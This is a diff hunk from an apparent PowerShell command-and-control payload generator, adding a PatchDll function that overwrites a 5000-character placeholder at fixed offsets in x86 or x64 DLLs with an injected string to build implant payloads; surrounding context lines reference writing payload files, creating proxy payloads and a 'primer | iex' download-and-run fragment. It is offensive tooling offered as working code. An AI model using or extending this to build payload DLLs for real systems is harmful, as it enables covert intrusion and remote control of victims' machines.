@@ -551,6 +551,42 @@ primer | iex }'
 
         Write-Host -Object "Payload written to: $FolderPath\payloads\payload.bat"  -ForegroundColor Green
     }
+    
+    function PatchDll {
+        param($dllBytes, $replaceString, $Arch)
+
+        if ($Arch -eq 'x86') {
+            $dllOffset = 0x00003640
+            $dllOffset = $dllOffset +8
+        }
+        if ($Arch -eq 'x64') {
+            $dllOffset = 0x00004470
+        }
+
+        # Patch DLL - replace 5000 A's
+        $AAAA = "A"*5000
+        $AAAABytes = ([System.Text.Encoding]::UNICODE).GetBytes($AAAA)
+        $replaceStringBytes = ([System.Text.Encoding]::UNICODE).GetBytes($replaceString)
+    
+        # Length of replacement code
+        $dllLength = $replaceString.Length
+        $patchLength = 5000 -$dllLength
+        $nullString = 0x00*$patchLength
+        $nullBytes = ([System.Text.Encoding]::UNICODE).GetBytes($nullString)
+        $nullBytes = $nullBytes[1..$patchLength]
+        $replaceNewStringBytes = ($replaceStringBytes+$nullBytes)
+
+        $dllLength = 10000 -3
+        $i=0
+        # Loop through each byte from start position
+        $dllOffset..($dllOffset + $dllLength) | % {
+            $dllBytes[$_] = $replaceNewStringBytes[$i]
+            $i++
+        }
+    
+        # Return Patched DLL
+        return $DllBytes
+    }
 
     # create proxypayloads
     function CreateProxyPayload 
